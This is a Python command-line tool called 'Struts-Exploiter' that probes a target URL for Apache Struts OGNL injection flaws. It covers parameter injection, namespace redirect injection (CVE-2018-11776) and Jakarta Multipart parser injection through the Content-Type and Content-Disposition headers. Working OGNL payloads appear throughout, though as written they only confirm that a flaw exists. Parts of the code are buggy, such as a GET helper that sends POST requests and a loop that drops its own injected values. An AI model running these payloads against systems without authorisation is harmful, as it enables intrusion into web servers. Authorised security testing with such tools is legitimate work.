#!/usr/bin/python3

import sys
import requests
import argparse
from urllib.parse import urlparse, parse_qs, quote, unquote
from http.cookies import SimpleCookie
import re
import copy

if len(sys.argv) <= 1:
    print('[*] Struts-Exploiter - gh0st27')
    print('\n%s -h for help.' % (sys.argv[0]))
    exit()

def get_parser():
    parser = argparse.ArgumentParser(prog='Struts-Exploiter.py', usage='Struts-Exploiter.py [options] --url "http://www.site.com/vuln.php?id=1"')
    parser.add_argument('-u', '--url',
                        dest="url",
                        help='Target URL (e.g."http://www.site.com/vuln.php?id=1")',
                        action='store'
                       )
    parser.add_argument('--data', dest='data',
                        help='Data string to be sent through POST (e.g. "id=1")', action='store'
                       )
    parser.add_argument('--cookies', dest='cookies',
                        help='HTTP cookies (eg. "jsessionid=1234")',action='store'
                       )
#    parser.add_argument('-p', dest='testparam',
#                       help='testable parameter',action='store'
#                       )
    parser.add_argument('--proxy', dest='proxy', help='Use a proxy to connect to the target URL',
                        action='store'
                       )

    return parser

def do_Multipart_Post_Request(ttarget, multipart_payload, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects):
    boundary = "---------------------------735323031399963166993862150"
    content_type = "multipart/form-data; boundary=%s" % (boundary)
    filename = "gh0st"
    payload = "--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--%s--\r\n\r\n" % (boundary, filename, str(multipart_payload), boundary)
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
    'Content-Type': content_type
    }
    try:
        output = b""
        with requests.post(ttarget, payload, cookies=dict_cookies, proxies=proxies_listener, timeout=timeout, headers=headers, verify=False, allow_redirects=allow_redirects, stream=True) as response:
            for i in response.iter_content():
                output += i
            r_headers =  response.headers
    except requests.exceptions.RequestException as e:
        print(e)
        exit()
    return output, r_headers


def do_Get(ttarget, dict_params, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects):
    try:
        output = b""
        with requests.post(ttarget, params=dict_params, cookies=dict_cookies, proxies=proxies_listener, timeout=timeout, headers=hheaders, verify=verify, allow_redirects=allow_redirects, stream=True) as response:
            for i in response.iter_content():
                output += i
            r_headers = response.headers
    except requests.exceptions.RequestException as e:
        print(e)
        exit()
    return output, r_headers


def do_Post(ttarget, raw_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects):
    try:
        output = b""
        with requests.post(ttarget, data=raw_data, cookies=dict_cookies, proxies=proxies_listener, timeout=timeout, headers=hheaders, verify=verify, allow_redirects=allow_redirects, stream=True) as response:
            for i in response.iter_content():
                output += i
            r_headers = response.headers
    except requests.exceptions.RequestException as e:
        print(e)
        exit()
    return output, r_headers


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    url, data, cookies, proxy = args['url'], args['data'],args['cookies'], args['proxy']

    # parse url & query string
    parsed_url = urlparse(url)
    target_url = parsed_url.geturl()
    query_param = parse_qs(parsed_url.query)

    if parsed_url.scheme == 'http':
        ns_target = parsed_url.scheme + "://" + parsed_url.netloc
    elif parsed_url.scheme =='https':
        ns_target = parsed_url.scheme + "://" + parsed_url.netloc
    else:
        print("There is somering wrong with the url")
        exit()

    path = parsed_url.path

    #convert cookie into dictionay if present
    if cookies is not None:
        cookie = SimpleCookie()
        cookie.load(cookies)
        cookies = {}
        for key, morsel in cookie.items():
            cookies[key] = morsel.value
            print(cookies, type(cookies))
    else:
        cookies = None
        print("cookie value is None")

    #Setup proxy listener
    if proxy is not None and proxy != '':
        proxies = {
            'http': 'http://%s' % (proxy),
            'https': 'http://%s' % (proxy)
        }
    else:
        proxies = None

    #convert post data to dictionary if present
    if data is not None:
        data = data
    else:
        data = None

    #Request parameters
    target = parsed_url.geturl()
    timeout = 5
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
    }
    allow_redirects = True
    verify = False
    dict_cookies = cookies
    proxies_listener = proxies
    dict_param = query_param
    raw_data = data

    #checking for ambigiuos request
    if raw_data is not None and bool(dict_param):
        print("iReqeust is ambigious.\n [*]Exiting......")
        exit()
    else:
        print("Reuest seems okay..")

    check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow_redirects, verify, dict_cookies, proxies_listener)

def check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow_redirects, verify, dict_cookies, proxies_listener):

    #OGNL Injection
    print("[*] checking for OGNL Injection")
    ttarget = copy.copy(target)
    hheaders = headers.copy()
    check_payload = 'ghost${"zkzz".toString().replace("k", "z")}'
    if raw_data is not None:
        print("Performing OGNL injection on Post parameters.........")
        data_url_decoded = unquote(raw_data)
        dict_data = dict(subString.split("=") for subString in data_url_decoded.split("&"))
        for key in dict_data.keys():
            temp_dict_data = dict_data.copy()
            temp_dict_data[key] = check_payload
            print('Checking POST  parameter {} for OGNL Injection using payload {} ........'.format(key, check_payload))
            output, r_headers = do_Post(ttarget, temp_dict_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
            match = re.search(r'ghostzzzz', str(output))
            if match:
                print("[+] target is vulnerable OGNL Injection")
            else:
                print("[-] target not vulnerable to OGNL Injectin")
            temp_dict_data.clear()
    else:
        print("performing oGNL injection on Query strings")
        for key in dict_param.keys():
            temp = dict_param.copy()
            temp[key] = check_payload
            print('Checking Get parameter {} for OGNL Injection using payload {} ........'.format(key, check_payload))
            output, r_headers = do_Get(ttarget, dict_param, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
            match = re.search(r'ghostzzzz', str(output))
            if match:
                print("[+] target is vulnerable OGNL Injection")
            else:
                print("[-] target not vulnerable to OGNL Injectin")
            temp.clear()

    #checking for namespace redirect cve-2018-11776
    if raw_data is not None:
        del ttarget
        ttarget = ns_target + "/" + quote(check_payload) + path
        print('checking Namespace Redirect OGNL Injection using payload {}...'.format(check_payload))
        output, r_headers = do_Post(ttarget, dict_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
        match = re.search(r'ghostzzzz', str(output))
        if match:
            print("[+] target is vulnerable to Namespace Redirect OGNL Injection")
        else:
            print("[-] target is not vulnerable to Namespace Redirect OGNL Injection")

    else:
        print("Preforming Namespace Redirect OGNL Injection...sending GET request")
        del ttarget
        ttarget = ns_target + "/" + quote(check_payload) + path
        print('checking Namespace Redirect OGNL Injection using payload {}...'.format(check_payload))
        output, r_headers = do_Get(ttarget, dict_param, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
        match = re.search(r'ghostzzzz', str(output))
        if match:
            print("[+] target is vulnerable to Namespace Redirect OGNL Injection")
        else:
            print("[-] target is not vulnerable to Namespace Redirect OGNL Injection")

    # Checking for Jakarta Multipart parser OGNL Injection - Content type header
    multipart_payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('strutsExploiter','gh0st27')}.multipart/form-data"
    hheaders['Content-Type'] = str(multipart_payload)
    del ttarget
    ttarget = target
    if raw_data is not None:
        print('checking Jarkarta Multipart parser OGNL Injection on Content Type header using payload {} '.format(str(multipart_payload)))
        payload, r_headers = do_Post(ttarget, dict_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects=False)
        if 'strutsExploiter' in r_headers.keys():
            if r_headers['strutsExploiter'] == 'gh0st27':
                print("[+] target is vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
        else:
            print("[-] target is not vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
    else:
        print('checking Jarkarta Multipart parser OGNL Injection on Content Type header using payload {} '.format(str(multipart_payload)))
        payload, r_headers = do_Get(ttarget, dict_param, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects=False)
        if 'strutsExploiter' in r_headers.keys():
            if r_headers['strutsExploiter'] == 'gh0st27':
                print("[+] target is vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
            else:
                print("[-] target is not vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
        hheaders.clear()

    # Checking for Jakarta Multipart parser OGNL Injection - Content disposition header
    print("Chekcing Jakarta based file upload Multipart parser: Content-Disposition")
    ttarget = copy.copy(target)
    payload, r_headers = do_Multipart_Post_Request(ttarget, multipart_payload, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects=False)
    if 'strutsExploiter' in r_headers.keys():
        if r_headers['strutsExploiter'] == 'gh0st27':
            print("[+] Target is vulnerable to Jakarta based file upload Multipart parser: Content-Disposition")
    else:
        print("[-] Target is not vulnerable to Jakarta based file upload Multipart parser: Content-Disposition")


if __name__ =='__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[*]KeyboardInterrupt Detected.')
        print('[*]Exiting...')
        exit()
